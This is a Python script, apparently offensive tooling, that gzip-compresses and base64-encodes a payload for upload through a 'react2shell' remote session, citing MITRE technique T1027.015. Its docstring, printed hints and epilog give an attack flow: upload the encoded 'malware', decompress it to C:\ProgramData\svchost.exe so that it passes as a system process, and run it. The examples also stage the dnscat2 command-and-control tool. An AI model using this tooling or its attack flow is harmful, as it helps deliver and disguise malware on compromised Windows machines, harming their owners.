#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Compress payload with gzip and optionally encode to base64
Supports T1027.015 - Obfuscated Files or Information: Compression

Usage:
    python compress_payload.py <input_file> [options]
    
Examples:
    # Compress to gzip only
    python compress_payload.py malware.exe -o malware.exe.gz
    
    # Compress and base64 encode (for upload command)
    python compress_payload.py malware.exe -o malware.exe.gz.b64 --b64
    
    # Compress and base64 encode in one line (no line breaks)
    python compress_payload.py dnscat2.exe -o dnscat2.gz.b64 --b64 -l 0
"""

import argparse
import gzip
import base64
import sys
import os


def compress_file(input_file, output_file=None, encode_b64=False, line_length=64):
    """
    Compress file with gzip and optionally base64 encode
    
    Args:
        input_file: Path to input file (any type)
        output_file: Path to output file, auto-generated if None
        encode_b64: If True, base64 encode the gzip output
        line_length: Characters per line for base64 (0 = no wrap)
    """
    
    # Read input file
    try:
        with open(input_file, 'rb') as f:
            content_bytes = f.read()
    except Exception as e:
        print(f"[!] Failed to read input file: {e}")
        return False
    
    original_size = len(content_bytes)
    
    # Compress with gzip
    compressed_bytes = gzip.compress(content_bytes, compresslevel=9)
    compressed_size = len(compressed_bytes)
    
    print(f"[+] Compression successful!")
    print(f"[*] Original size: {original_size} bytes")
    print(f"[*] Compressed size: {compressed_size} bytes")
    print(f"[*] Compression ratio: {100 - (compressed_size * 100 / original_size):.1f}%")
    
    # Determine output filename
    if output_file is None:
        if encode_b64:
            output_file = f"{input_file}.gz.b64"
        else:
            output_file = f"{input_file}.gz"
    
    # Encode to base64 if requested
    if encode_b64:
        base64_bytes = base64.b64encode(compressed_bytes)
        base64_string = base64_bytes.decode('ascii')
        
        # Split into lines if line_length > 0
        if line_length <= 0:
            output_content = base64_string
        else:
            lines = []
            for i in range(0, len(base64_string), line_length):
                lines.append(base64_string[i:i + line_length])
            output_content = '\n'.join(lines)
        
        # Write as text
        try:
            with open(output_file, 'w', encoding='ascii') as f:
                f.write(output_content)
        except Exception as e:
            print(f"[!] Failed to write output file: {e}")
            return False
        
        output_size = os.path.getsize(output_file)
        print(f"[*] Base64 size: {len(base64_string)} bytes")
        print(f"[*] Output file: {output_file} ({output_size} bytes)")
        if line_length > 0:
            print(f"[*] Lines: {len(lines)} x {line_length} chars")
        else:
            print(f"[*] Format: single line (no wrapping)")
        
        print(f"\n[+] Usage in react2shell:")
        print(f"    upload {os.path.basename(output_file)} C:\\Windows\\Temp\\{os.path.basename(output_file)}")
        print(f"    decompress C:\\Windows\\Temp\\{os.path.basename(output_file)} C:\\ProgramData\\{os.path.basename(input_file)}")
    
    else:
        # Write compressed binary
        try:
            with open(output_file, 'wb') as f:
                f.write(compressed_bytes)
        except Exception as e:
            print(f"[!] Failed to write output file: {e}")
            return False
        
        output_size = os.path.getsize(output_file)
        print(f"[*] Output file: {output_file} ({output_size} bytes)")
        
        print(f"\n[+] Manual upload & decompress:")
        print(f"    1. Upload {os.path.basename(output_file)} to target")
        print(f"    2. Run: decompress <path_to_gz> <output_path>")
    
    return True


def main():
    parser = argparse.ArgumentParser(
        description='Compress payload with gzip (T1027.015)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Compress executable to gzip
  python compress_payload.py malware.exe
  
  # Compress and base64 encode (ready for react2shell upload)
  python compress_payload.py dnscat2.exe -o dnscat2.gz.b64 --b64
  
  # Compress and base64 encode in one line (no wrapping)
  python compress_payload.py payload.dll -o payload.gz.b64 --b64 -l 0
  
  # Custom output path
  python compress_payload.py tool.exe -o C:\\payloads\\tool.gz
  
Attack Flow:
  1. Compress payload locally:
     python compress_payload.py malware.exe -o malware.gz.b64 --b64 -l 0
  
  2. In react2shell session:
     upload malware.gz.b64 C:\\Windows\\Temp\\svc.gz.b64
     decompress C:\\Windows\\Temp\\svc.gz.b64 C:\\ProgramData\\svchost.exe
     run C:\\ProgramData\\svchost.exe
        """
    )
    
    parser.add_argument('input', help='Input file to compress')
    parser.add_argument('-o', '--output', help='Output file path', default=None)
    parser.add_argument('--b64', action='store_true',
                        help='Base64 encode the compressed file (for upload command)')
    parser.add_argument('-l', '--line-length', type=int, default=64,
                        help='Base64 line length (default: 64, 0 = no wrap)')
    
    args = parser.parse_args()
    
    # Verify input file exists
    if not os.path.exists(args.input):
        print(f"[!] Input file not found: {args.input}")
        sys.exit(1)
    
    # Compress
    success = compress_file(
        args.input,
        args.output,
        args.b64,
        args.line_length
    )
    
    sys.exit(0 if success else 1)


if __name__ == '__main__':
    main()
